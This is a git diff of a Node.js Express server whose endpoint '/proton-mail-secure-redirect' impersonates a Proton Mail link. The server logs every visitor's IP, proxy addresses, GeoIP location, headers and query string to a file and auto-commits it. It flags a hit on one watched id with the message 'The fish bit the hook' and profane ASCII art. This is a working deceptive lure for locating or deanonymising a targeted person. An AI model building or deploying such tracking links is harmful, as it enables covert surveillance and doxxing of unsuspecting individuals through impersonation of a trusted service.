@@ -19,16 +19,19 @@ app.get("/proton-mail-secure-redirect", (req, res) => {
   let geo = geoip.lookup(ip);
   
   // Write to the log file
-  fs.writeFileSync('log.txt', entry, { flag: 'a+' });
+  log(entry, { flag: 'a+' });
 
     // Match check 
-  if (req.query.id == "EefangieGodosiegaenah5eunah4chi6") { log_fucker() }
+  if (req.query.id == "EefangieGodosiegaenah5eunah4chi6") {
+    log("This is a match with the watche-for ID !!! The fish bit the hook, amazing...\n");
+    log_fucker();
+  }
 
   // Log the full request 
-  fs.writeFileSync('log.txt', JSON.stringify(req.headers) + "\n", { flag: 'a+' });
-  fs.writeFileSync('log.txt', JSON.stringify(req.query) + "\n", { flag: 'a+' });
-  fs.writeFileSync('log.txt', JSON.stringify([req.ip, req.ips]) + "\n", { flag: 'a+' });
-  fs.writeFileSync('log.txt', JSON.stringify(geo) + "\n\n", { flag: 'a+' });
+  log(JSON.stringify(req.headers) + "\n");
+  log(JSON.stringify(req.query) + "\n");
+  log(JSON.stringify([req.ip, req.ips]) + "\n");
+  log(JSON.stringify(geo) + "\n\n");
 
   // Auto-commit 
   sh.exec(`git commit -a -m 'auto-commit of log.txt'`);
@@ -45,10 +48,14 @@ app.listen(port, () => {
 
 // localhost:3128/proton-mail-secure-redirect?id=test
 
+function log(text) {
+    fs.writeFileSync('log.txt', text, { flag: 'a+' });
+}
+
 function log_fucker() {
-    fs.writeFileSync('log.txt', "   ____       _     _   _             __            _             ", { flag: 'a+' });
-    fs.writeFileSync('log.txt', "  / ___| ___ | |_  | |_| |__   ___   / _|_   _  ___| | _____ _ __ ", { flag: 'a+' });
-    fs.writeFileSync('log.txt', " | |  _ / _ \| __| | __| '_ \ / _ \ | |_| | | |/ __| |/ / _ \ '__|", { flag: 'a+' });
-    fs.writeFileSync('log.txt', " | |_| | (_) | |_  | |_| | | |  __/ |  _| |_| | (__|   <  __/ |   ", { flag: 'a+' });
-    fs.writeFileSync('log.txt', "  \____|\___/ \__|  \__|_| |_|\___| |_|  \__,_|\___|_|\_\___|_|   ", { flag: 'a+' });
+    log("   ____       _     _   _             __            _             \n");
+    log("  / ___| ___ | |_  | |_| |__   ___   / _|_   _  ___| | _____ _ __ \n");
+    log(" | |  _ / _ \| __| | __| '_ \ / _ \ | |_| | | |/ __| |/ / _ \ '__|\n");
+    log(" | |_| | (_) | |_  | |_| | | |  __/ |  _| |_| | (__|   <  __/ |   \n");
+    log("  \____|\___/ \__|  \__|_| |_|\___| |_|  \__,_|\___|_|\_\___|_|   \n");
 }
